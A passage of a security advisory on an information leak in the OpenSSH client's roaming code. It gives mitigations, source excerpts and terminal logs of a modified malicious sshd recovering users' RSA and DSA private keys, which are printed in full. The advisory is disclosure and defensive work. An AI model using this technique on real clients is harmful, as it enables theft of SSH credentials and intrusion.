1. The vulnerable roaming code can be permanently disabled by adding the
undocumented option ""UseRoaming no"" to the system-wide configuration
file (usually /etc/ssh/ssh_config), or per-user configuration file
(~/.ssh/config), or command-line (-o ""UseRoaming no"").
2. If an OpenSSH client is disconnected from an SSH server that offers
roaming, it prints ""[connection suspended, press return to resume]"" on
stderr, and waits for ' ' or ' ' on stdin (and not on the controlling
terminal) before it reconnects to the server; advanced users may become
suspicious and press Control-C or Control-Z instead, thus avoiding the
information leak:
# ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume]^Z
[1]+ Stopped /usr/bin/ssh -p 222 127.0.0.1
However, SSH commands that use the local stdin to transfer data to the
remote server are bound to trigger this reconnection automatically (upon
reading a ' ' or ' ' from stdin). Moreover, these non-interactive SSH
commands (for example, backup scripts and cron jobs) commonly employ
public-key authentication and are therefore perfect targets for this
information leak:
$ ls -l /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 ""cat > /tmp/passwd.ls""
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
$ tar -cf - /etc/passwd | /usr/bin/ssh -p 222 127.0.0.1 ""cat > /tmp/passwd.tar""
tar: Removing leading `/' from member names
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
...
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
Similarly, the SCP client uses the SSH client's stdin and stdout to
transfer data, and can be forced by a malicious SSH server to output a
control record that ends in ' ' (an error message in server-to-client
mode, or file permissions in client-to-server mode); this ' ' is then
read from stdin by the fgetc() call in wait_for_roaming_reconnect(), and
triggers an automatic reconnection that allows the information leak to
be exploited without user interaction:
# env ROAMING=""scp_mode sleep:1"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /dev/null -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/scp -P 222 127.0.0.1:/etc/passwd /tmp
$ [connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
$ /usr/bin/scp -P 222 /etc/passwd 127.0.0.1:/tmp
[connection suspended, press return to resume][connection resumed]
[connection suspended, press return to resume][exiting]
lost connection
3. Although a man-in-the-middle attacker can reset the TCP connection
between an OpenSSH client and an OpenSSH server (which does not support
roaming), it cannot exploit the information leak without breaking server
host authentication or integrity protection, because it needs to:
- first, append the ""resume appgate com"" algorithm name to the server's
initial key exchange message;
- second, in response to the client's ""roaming appgate com"" request,
change the server's reply from failure to success.
In conclusion, an attacker who wishes to exploit this information leak
must convince its target OpenSSH client to connect to a malicious server
(an unlikely scenario), or compromise a trusted server (a more likely
scenario, for a determined attacker).
4. We discovered several non-security bugs, in specific versions and
configurations of OpenSSH, that prevent the client's roaming code from
reconnecting to the server and, as a result, prevent this information
leak from being exploited. In the client, wait_for_roaming_reconnect()
calls ssh_connect(), the same function that successfully established the
first connection to the server; this function supports four different
connection methods, but each method contains a bug and may fail to
establish a second connection to the server:
- In OpenSSH >= 6.5 (released on January 30, 2014), the default
ssh_connect_direct() method (a simple TCP connection) is called by
wait_for_roaming_reconnect() with a NULL aitop argument, which makes
it impossible for the client to reconnect to the server:
418 static int
419 ssh_connect_direct(const char *host, struct addrinfo *aitop,
...
424 int sock = -1, attempt;
425 char ntop[NI_MAXHOST], strport[NI_MAXSERV];
...
430 for (attempt = 0; attempt < connection_attempts; attempt++) {
...
440 for (ai = aitop; ai; ai = ai->ai_next) {
...
470 }
471 if (sock != -1)
472 break; /* Successful connection. */
473 }
474
475 /* Return failure if we didn't get a successful connection. */
476 if (sock == -1) {
477 error(""ssh: connect to host %s port %s: %s"",
478 host, strport, strerror(errno));
479 return (-1);
480 }
Incidentally, this error() call displays stack memory from the
uninitialized strport[] array, a byproduct of the NULL aitop:
$ /usr/bin/ssh -V
OpenSSH_6.8, LibreSSL 2.1
$ /usr/bin/ssh -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume]ssh: connect to host 127.0.0.1 port 300350226373341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port 300350226373341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port 300350226373341: Bad file descriptor
[reconnect failed, press return to retry]ssh: connect to host 127.0.0.1 port 300350226373341: Bad file descriptor
- The special ProxyCommand ""-"" communicates with the server through the
client's stdin and stdout, but these file descriptors are close()d by
packet_backup_state() at the beginning of wait_for_roaming_reconnect()
and are never reopened again, making it impossible for the client to
reconnect to the server. Moreover, the fgetc() that waits for ' ' or
' ' on the closed stdin returns EOF and forces the client to exit():
$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013
$ /usr/bin/nc -e ""/usr/bin/ssh -o ProxyCommand=- -p 222 127.0.0.1"" 127.0.0.1 222
Pseudo-terminal will not be allocated because stdin is not a terminal.
user 127 0 0 1's password:
[connection suspended, press return to resume][exiting]
- The method ssh_proxy_fdpass_connect() fork()s a ProxyCommand that
passes a connected file descriptor back to the client, but it calls
fatal() while reconnecting to the server, because waitpid() returns
ECHILD; indeed, the SIGCHLD handler (installed by SSH's main() after
the first successful connection to the server) calls waitpid() before
ssh_proxy_fdpass_connect() does:
1782 static void
1783 main_sigchld_handler(int sig)
1784 {
....
1789 while ((pid = waitpid(-1, &status, WNOHANG)) > 0 ||
1790 (pid < 0 && errno == EINTR))
1791 ;
1792
1793 signal(sig, main_sigchld_handler);
....
1795 }
101 static int
102 ssh_proxy_fdpass_connect(const char *host, u_short port,
103 const char *proxy_command)
104 {
...
121 /* Fork and execute the proxy command. */
122 if ((pid = fork()) == 0) {
...
157 }
158 /* Parent. */
...
167 while (waitpid(pid, NULL, 0) == -1)
168 if (errno != EINTR)
169 fatal(""Couldn't wait for child: %s"", strerror(errno));
$ /usr/bin/ssh -V
OpenSSH_6.6.1p1, OpenSSL 1.0.1p-freebsd 9 Jul 2015
$ /usr/bin/ssh -o ProxyUseFdpass=yes -o ProxyCommand=""/usr/bin/nc -F %h %p"" -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume]Couldn't wait for child: No child processes
- The method ssh_proxy_connect() fork()s a standard ProxyCommand that
connects the client to the server, but if a disconnection occurs, and
the SIGCHLD of the terminated ProxyCommand is caught while fgetc() is
waiting for a ' ' or ' ' on stdin, EOF is returned (the underlying
read() returns EINTR) and the client exit()s before it can reconnect
to the server:
$ /usr/bin/ssh -V
OpenSSH_6.6.1p1 Ubuntu-2ubuntu2, OpenSSL 1.0.1f 6 Jan 2014
$ /usr/bin/ssh -o ProxyCommand=""/bin/nc %h %p"" -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume][exiting]
This behavior is intriguing, because (at least on Linux and BSD) the
signal() call that installed the main_sigchld_handler() is supposed to
be equivalent to a sigaction() call with SA_RESTART. However, portable
versions of OpenSSH override signal() with mysignal(), a function that
calls sigaction() without SA_RESTART.
This last mitigating factor is actually a race-condition bug that
depends on the ProxyCommand itself: for example, the client never
fails to reconnect to the server when using Socat as a ProxyCommand,
but fails occasionally when using Netcat.
------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 10.0, 2048-bit RSA key
------------------------------------------------------------------------
$ head -n 1 /etc/motd
FreeBSD 10.0-RELEASE (GENERIC) #0 r260789: Thu Jan 16 22:34:59 UTC 2014
$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-freebsd 11 Feb 2013
$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme
vOzVcOC+Y/wkpJET3ZEhNrPFZ0a0ab5JLxRwQk9mFYuGpOO8H5av5Nm8/PRB7JHi
/rnxmfPGIWJX2dG9AInmVFGWBQCNUxwwQzpz9/VnngsjMWoYSayU534SrE36HFtE
K+nsuxA+vtalgniToudAr6H5AoGADIkZeAPAmQQIrJZCylY00dW+9G/0mbZYJdBr
+7TZERv+bZXaq3UPQsUmMJWyJsNbzq3FBIx4Xt0/QApLAUsa+l26qLb8V+yDCZ+n
UxvMSgpRinkMFK/Je0L+IMwua00w7jSmEcMq0LJckwtdjHqo9rdWkvavZb13Vxh7
qsm+NEcCgYEA3KEbTiOU8Ynhv96JD6jDwnSq5YtuhmQnDuHPxojgxSafJOuISI11
1+xJgEALo8QBQT441QSLdPL1ZNpxoBVAJ2a23OJ/Sp8dXCKHjBK/kSdW3U8SJPjV
pmvQ0UqnUpUj0h4CVxUco4C906qZSO5Cemu6g6smXch1BCUnY0TcOgs=
-----END RSA PRIVATE KEY-----
# env ROAMING=""client_out_buf_size:1280"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume][connection resumed]
# cat /tmp/roaming-97ed9f59/infoleak
MIIEpQIBAAKCAQEA3GKWpUCOmK05ybfhnXTTzWAXs5A0FufmqlihRKqKHyflYXhr
qlcdPH4PvbAhkc8cUlK4c/dZxNiyD04Og1MVwVp2kWp9ZDOnuLhTR2mTxYjEy+1T
M3/74toaLj28kwbQjTPKhENMlqe+QVH7pH3kdun92SEqzKr7Pjx4/2YzAbAlZpT0
9Zj/bOgA7KYWfjvJ0E9QQZaY68nEB4+vIK3agB6+JT6lFjVnSFYiNQJTPVedhisd
a3KoK33SmtURvSgSLBqO6e9uPzV87nMfnSUsYXeej6yJTR0br44q+3paJ7ohhFxD
zzqpKnK99F0uKcgrjc3rF1EnlyexIDohqvrxEQIDAQABAoIBAQDHvAJUGsIh1T0+
eIzdq3gZ9jEE6HiNGfeQA2uFVBqCSiI1yHGrm/A/VvDlNa/2+gHtClNppo+RO+OE
w3Wbx70708UJ3b1vBvHHFCdF3YWzzVSujZSOZDvhSVHY/tLdXZu9nWa5oFTVZYmk
oayzU/WvYDpUgx7LB1tU+HGg5vrrVw6vLPDX77SIJcKuqb9gjrPCWsURoVzkWoWc
bvba18loP+bZskRLQ/eHuMpO5ra23QPRmb0p/LARtBW4LMFTkvytsDrmg1OhKg4C
vcbTu2WOK1BqeLepNzTSg2wHtvX8DRUJvYBXKosGbaoIOFZvohoqSzKFs+R3L3GW
hZz9MxCRAoGBAPITboUDMRmvUblU58VW85f1cmPvrWtFu7XbRjOi3O/PcyT9HyoW
bc3HIg1k4XgHk5+F9r5+eU1CiUUd8bOnwMEUTkyr7YH/es+O2P+UoypbpPCfEzEd
muzCFN1kwr4RJ5RG7ygxF8/h/toXua1nv/5pruro+G+NI2niDtaPkLdfAoGBAOkP
wn7j8F51DCxeXbp/nKc4xtuuciQXFZSz8qV/gvAsHzKjtpmB+ghPFbH+T3vvDCGF
iKELCHLdE3vvqbFIkjoBYbYwJ22m4y2V5HVL/mP5lCNWiRhRyXZ7/2dd2Jmk8jrw
sj/akWIzXWyRlPDWM19gnHRKP4Edou/Kv9Hp2V2PAoGBAInVzqQmARsi3GGumpme
------------------------------------------------------------------------
Private Key Disclosure example: FreeBSD 9.2, 1024-bit DSA key
------------------------------------------------------------------------
$ head -n 1 /etc/motd
FreeBSD 9.2-RELEASE (GENERIC) #0 r255898: Fri Sep 27 03:52:52 UTC 2013
$ /usr/bin/ssh -V
OpenSSH_6.2p2, OpenSSL 0.9.8y 5 Feb 2013
$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
-----END DSA PRIVATE KEY-----
# env ROAMING=""client_out_buf_size:768"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]
# cat /tmp/roaming-9448bb7f/infoleak
MIIBugIBAAKBgQCEfEo25eMTu/xrpVQxBGEjW/WEfeH4jfqaCDluPBlcl5dFd8KP
grGm6fh8c+xdNYRg+ogHwM3uDG5aY62X804UGysCUoY5isSDkkwGrbbemHxR/Cxe
4bxlIbQrw8KY39xLOY0hC5mpPnB01Cr+otxanYUTpsb8gpEngVvK619O0wIVAJwY
8RLHmLnPaMFSOvYvGW6eZNgtAoGACkP73ltWMdHM1d0W8Tv403yRPaoCRIiTVQOw
oM8/PQ1JVFmBJxrJXtFJo88TevlDHLEghapj4Wvpx8NJY917bC425T2zDlJ4L9rP
IeOjqy+HwGtDXjTHspmGy59CNe8E6vowZ3XM4HYH0n4GcwHvmzbhjJxYGmGJrng4
cRh4VTwCgYAPxVV+3eA46WWZzlnttzxnrr/w/9yUC/DfrKKQ2OGSQ9zyVn7QEEI+
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
...
# env ROAMING=""client_out_buf_size:1024"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
[connection suspended, press return to resume][connection resumed]
# cat /tmp/roaming-279f5e2b/infoleak
...
iUB2lkeMqjNwPkxddONOBZB7kFmjOS69Qp0mfmsRf15xneqU8IoMSwqa5LOXM0To
zEpLjvCtyTJcJgz2oHglVUJqGAx8CQJq2wS+eiSQqJbQpmexNa5GfwIUKbRxQKlh
PHatTfiy5p82Q8+TD60=
...
------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.4, 2048-bit RSA key
------------------------------------------------------------------------
$ head -n 1 /etc/motd
OpenBSD 5.4 (GENERIC) #37: Tue Jul 30 15:24:05 MDT 2013
$ /usr/bin/ssh -V
OpenSSH_6.3, OpenSSL 1.0.1c 10 May 2012
$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=
-----END RSA PRIVATE KEY-----
# env ROAMING=""client_out_buf_size:2048"" ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume][connection resumed]
# cat /tmp/roaming-35ee7ab0/infoleak
MIIEogIBAAKCAQEAzjortydu20T6wC6BhFzKNtVJ9uYSMOjWlghws4OkcXQtu+Cc
VEhdal/HFyKyiNMAUDMi0gjOHsia8X4GS7xRNwSjUHOXnrvPne/bGF0d4DAxfAFL
9bOwoNnBIEFci37YMOcGArvrEJ7hbjJhGTudekRU78IMOichpdYtkpkGUyGmf175
ynUpCcJdzngL8yF9Iezc8bfXAyIJjzjXmSVu9DypkeUBW28qIuMr5ksbekHcXhQn
w8Y2oEDeyPSGIdWZQcVpdfaAk+QjCEs84c0/AvZoG2iY85OptjNDfynFJSDR5muU
MANXJm5JFfC89fy0nGkQJa1FfNpPjUQY8hWz7QIDAQABAoIBAQC36R6FJrBw8PIh
oxezv8BB6DIe8gx0+6AqinpfTN3Ao9gJPYSMkUBlleaJllLbPDiCTSgXYOzYfRPY
mwfoUJeo1gUCwSMM1vaPJZEhCCGVhcULjmh8RHQW7jqRllh+um74JX6xv34hA1+M
k3cONqD4oamRa17WGYGjT/6yRq9iP/0AbBT+haRKYC4nKWrdkqEJXk10pM2kmH6G
+umbybQrGrPf854VqOdftoku0WjBKrD0hsFZbB24rYmFj+cmbx+cDEqt03xjw+95
n5xM/97jqB6rzkPAdRUuzNec+QNGMvA+4YpItF1vdEfd0N3Jl/VIQ+8ZAhANnvCt
8uRHC7OhAoGBAO9PqmApW1CY+BeYDyqGduLwh1HVVZnEURQJprenOtoNxfk7hkNw
rsKKdc6alWgTArLTEHdULU8GcZ6C0PEcszk2us3AwfPKko8gp2PD5t/8IW0cWxT5
cMxcelFydu8MuikFthqNEX4tPNrZy4FZlOBGXCYlhvDqHk+U7kVIhkLFAoGBANyb
3pLYm7gEs9zoL5HxEGvk9x2Ds9PlULcmc//p+4HCegE0tehMaGtygQKRQFuDKOJV
WGKRjgls7vVXeVI2RABtYsT6OSBU9kNQ01EHzjOqN53O43e6GB4EA+W/GLEsffOZ
pCw09bOVvgClicyekO3kv0lsVvIfAWgxVQY0oZ8JAoGBAIyisquEYmeBHfsvn2oM
T32agMu0pXOSDVvLODChlFJk2b1YH9UuOWWWXRknezoIQgO5Sen2jBHu5YKTuhqY
FTNAWJNl/hU5LNv0Aqr8i4eB8lre2SAAXyuaBUAsFnzxa82Dz7rWwDr4dtTePVws
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
$ /usr/bin/ssh -p 222 127.0.0.1
user 127 0 0 1's password:
[connection suspended, press return to resume][connection resumed]
# cat /tmp/roaming-6cb31d82/infoleak
...
uvL6Jlk8oIqf62Q1T7ljn5NJAoGAQ8ZHHMobHO+k6ksSwj1TFDKlkJWzm3ep0nqn
zIlv0S+UF+a/s/w1YD0vUUCaiwLCfrZFjxK0lkS3LPyQsyckwRTZ8TYGct5nQcsF
ALHrMYgryfmTfGbZne8R23VX+qZ2k24yN7qVeXSZiM1ShmB4mf1anw3/sCbCYeY1
/tAQjzECf1NKzRdfWRhiBqlEquNshrUNWQxYVnXl+WPgilKAIc1XJ9M0dOCvhwjk
kRTxN77l+klobzq+q+BtPiy9mFmwtwPbAP8l5bVzkZSY2FBDOQiUWS9ZJrCUupeS
Y1tzYFyta0xSod/NGoUd673IgfLnfiGMOLhy+9qhhwCqF10RiS0=
------------------------------------------------------------------------
Private Key Disclosure example: OpenBSD 5.8, 2048-bit RSA key
------------------------------------------------------------------------
$ head -n 1 /etc/motd
OpenBSD 5.8 (GENERIC) #1066: Sun Aug 16 02:33:00 MDT 2015
$ /usr/bin/ssh -V
OpenSSH_7.0, LibreSSL 2.2.2
$ cat ~/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAwe9ssfYbABhOGxnBDsPf5Hwypr3tVz4ZCK2Q9ZWWBYnk+KVL
ruLv7NWzeuKF7ls8z4SdpP/09QIIWQO5xWmQ7OM7ndfHWexFoyS/MijorHLvwG1s
17KFF8aC5vcBTfVkWnFaERueyd+mxv+oIrskA3/DK7/Juojkq70aPAdafiWOuVT8
L/2exFuzpSmwiXbPuiPgImO9O+9VQ4flZ4qlO18kZxXF948GisxxkceOYWTIX6uh
xSs/NEGF/drmB4RTAL1ZivG+e4IMxs5naLz4u3Vb8WTDeS6D62WM1eq5JRdlZtGP
vavL01Kv3sYFvoD0OPUU4BjU8bd4Qb30C3719wIDAQABAoIBAG4zFpipN/590SQl
Jka1luvGhyGoms0QRDliJxTlwzGygaGoi7D800jIxgv13BTtU0i4Grw/lXoDharP
Kyi6K9fv51hx3J2EXK2vm9Vs2YnkZcf6ZfbLQkWYT5nekacy4ati7cL65uffZm19
qJTTsksqtkSN3ptYXlgYRGgH5av3vaTSTGStL8D0e9fcrjSdN0UntjBB7QGT8ZnY
gQ1bsSlcPM/TB6JYmHWdpCAVeeCJdDhYoHKlwgQuTdpubdlM80f6qat7bsm95ZTK
QolQFpmAXeU4Bs5kFlm0K0qYFkWNdI16ScOpK6AQZGUTcHICeRL3GEm6NC0HYBNt
gKHPucECgYEA7ssL293PZR3W9abbivDxvtCjA+41L8Rl8k+J0Dj0QTQfeHxHD2eL
cQO2lx4N3E9bJMUnnmjxIT84Dg7SqOWThh3Rof+c/vglyy5o/CzbScISQTvjKfuB
+s5aNojIqkyKaesQyxmdacLxtBBppZvzCDTHBXvAe4t8Bus2DPBzbzsCgYEAz+jl
hcsMQ1egiVVpxHdjtm3+D1lbgITk0hzIt9DYEIMBJ7y5Gp2mrcroJAzt7VA2s7Ri
hBSGv1pjz4j82l00odjCyiUrwvE1Gs48rChzT1PcQvtPCCanDvxOHwpKlUTdUKZh
vhxPK/DW3IgUL0MlaTOjncR1Zppz4xpF/cSlYHUCgYB0MhVZLXvHxlddPY5C86+O
nFNWjEkRL040NIPo8G3adJSDumWRl18A5T+qFRPFik/depomuQXsmaibHpdfXCcG
8eeaHpm0b+dkEPdBDkq+f1MGry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==
-----END RSA PRIVATE KEY-----
# ""`pwd`""/sshd -o ListenAddress=127.0.0.1:222 -o UsePrivilegeSeparation=no -f /etc/ssh/sshd_config -h /etc/ssh/ssh_host_rsa_key
$ /usr/bin/ssh -o ProxyCommand=""/usr/bin/nc -w 1 %h %p"" -p 222 127.0.0.1
[connection suspended, press return to resume]Segmentation fault (core dumped)
(this example requires a ProxyCommand because of the NULL-aitop bug
described in the Mitigating Factors of the Information Leak section, and
crashes because of the NULL-pointer dereference discussed in the
Mitigating Factors of the Buffer Overflow section)
# cat /tmp/roaming-a5eca355/infoleak
ry+AtEOxWUwIkVKjm48Wry2CxroURqn6Zqohzdra
uWPGxUsKUvtNGpM4hKCHFQKBgQCM8ylXkRZZOTjeogc4aHAzJ1KL+VptQKsYPudc
prs0RnwsAmfDQYnUXLEQb6uFrVHIdswrGvdXFuJ/ujEhoPqjlp5ICPcoC/qil5rO
ZAX4i7PRvSoRLpMnN6mGpaV2mN8pZALzraGG+pnPnHmCqRTdw2Jy/NNSofdayV8V
8ZDkWQKBgQC2pNzgDrXLe+DIUvdKg88483kIR/hP2yJG1V7s+NaDEigIk8BO6qvp
ppa4JYanVDl2TpV258nE0opFQ66Q9sN61SfWfNqyUelZTOTzJIsGNgxDFGvyUTrz
uiC4d/e3Jlxj21nUciQIe4imMb6nGFbUIsylUrDn8GfA65aePLuaSg==
------------------------------------------------------------------------
Private Key Disclosure example: CentOS 7, 1024-bit DSA key
------------------------------------------------------------------------
$ grep PRETTY_NAME= /etc/os-release
PRETTY_NAME=""CentOS Linux 7 (Core)""
$ /usr/bin/ssh -V
OpenSSH_6.4p1, OpenSSL 1.0.1e-fips 11 Feb 2013
$ cat ~/.ssh/id_dsa
-----BEGIN DSA PRIVATE KEY-----
